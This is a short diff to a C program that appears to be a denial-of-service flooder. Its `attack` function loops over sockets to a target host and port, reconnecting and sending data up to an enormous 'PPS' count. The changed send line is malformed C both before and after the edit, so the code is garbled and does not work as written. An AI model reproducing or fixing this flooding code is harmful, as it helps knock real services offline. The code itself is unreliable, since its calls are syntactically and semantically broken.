@@ -11,6 +11,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#define buffer 1024
 #define PPS 1337133713371337
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
@@ -62,7 +63,7 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x != PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-		    ssize_t send(sockets[x], "\0", 0);
+		    ssize_t send(sockets, buffer, 0);
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
